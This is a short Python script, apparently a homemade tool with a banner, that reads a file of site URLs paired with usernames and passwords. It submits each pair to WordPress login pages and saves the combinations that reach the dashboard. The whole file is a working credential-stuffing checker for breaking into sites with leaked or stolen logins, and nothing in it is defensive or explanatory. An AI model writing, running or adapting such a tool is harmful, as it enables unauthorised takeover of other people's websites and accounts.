import requests
from colorama import Fore , init

def ascii():
 ascii_art = """\033[92m
 ██████╗ ██╗   ██╗     █████╗ ██╗   ██╗ ██╗ ██████╗        
 ██╔══██╗╚██╗ ██╔╝    ██╔══██╗╚██╗ ██╔╝███║██╔═████╗       
 ██████╔╝ ╚████╔╝     ███████║ ╚████╔╝ ╚██║██║██╔██║       
 ██╔══██╗  ╚██╔╝      ██╔══██║  ╚██╔╝   ██║████╔╝██║       
 ██████╔╝   ██║       ██║  ██║   ██║    ██║╚██████╔╝       
 ╚═════╝    ╚═╝       ╚═╝  ╚═╝   ╚═╝    ╚═╝ ╚═════╝        
 \033[0m"""
 print(ascii_art)


def checker():
 file = input(r"entre the file you want to check: ")
 outputfile = input(r"entre the output file: ")
 with open(file , "r") as f:
  for line in f:
   line = line.strip()
   koko = line.split(":")
   if len(koko) != 4:
    print("not good format")
    continue
   protocol, url, user, pas = koko
   pss = pas
   user = user
   protocol = protocol
   url = url
   try:
    with requests.Session() as s:
     headers1 = {'Cookie': 'wordpress_test_cookie=WP Cookie check'}
     admin = f"{protocol}:{url}/wp-admin"
     datas = {
      'log': user, 'pwd': pss, 'wp-submit': 'Log In',
      'redirect_to': admin, 'testcookie': '1'}
     login = f"{protocol}:{url}/wp-login.php"
     r = s.post(login, headers=headers1, data=datas)
     if "dashboard" in r.text.lower():
      with open(outputfile , "a") as output:
       print(f"login success  with {user} {pas} in {protocol}://{url}/wp-login.php/n" + Fore.GREEN)
       output.write(f"login success with {user} {pas} in {protocol}://{url}/wp-login.php")
     else:
      print("login failed!" + Fore.RED)
   except Exception as e:
    print(e)
    continue

ascii()
checker()
